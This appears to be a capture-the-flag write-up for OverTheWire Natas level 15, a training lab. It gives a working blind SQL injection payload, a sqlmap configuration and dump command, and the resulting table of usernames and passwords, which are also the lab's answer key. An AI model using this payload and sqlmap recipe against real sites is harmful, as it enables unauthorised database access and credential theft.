Challenge page is <a href="">HERE</a>.

<<CHALLENGE_CONTENT
Level 15

Username: natas15
URL:      http://natas15.natas.labs.overthewire.org

CHALLENGE_CONTENT

Password for this level (from last level)
	- username: natas15
	- password: m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV

Comment by me:
	- There is a vulnerable for SQL injection, but there is no way to display the result.
	- Tried SELECT .. INTO OUTFILE , it does not work. It seems the database prevents this.
	- Tried seperate command with semi-colon(';') but does not seem to work
	- Only way to try is to blind injection and see if result back as true/false

	Try:
		" or (select count(*) from users)=4 #--  >>>>> total users = 4
	- It is quite tiresome to enumerate manually, so I use SQLMap to handle this.
	- SQLMap config file is the file 'sqlmap.conf'
		- url = http://natas15.natas.labs.overthewire.org/index.php
		- data = username=a
		- filter on the string 'exists' as correct result for boolean-based sql
		- change risk=3 (to enable Boolean-based with OR)
		- change level=3 (to get sqlmap tries harder, to get that this is a vulnerability)
		- aType, aCred is set for HTTP Basic Authentication
		- testParameter = username

	- To run for dumping all data in table 'users'
		/path_to_sqlmap/sqlmap.py -c ./sqlmap.conf -T users --dump

RESULT (From SQLMap)
Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| natas16  | 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L |
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| alice    | hROtsfM734                       |
+----------+----------------------------------+
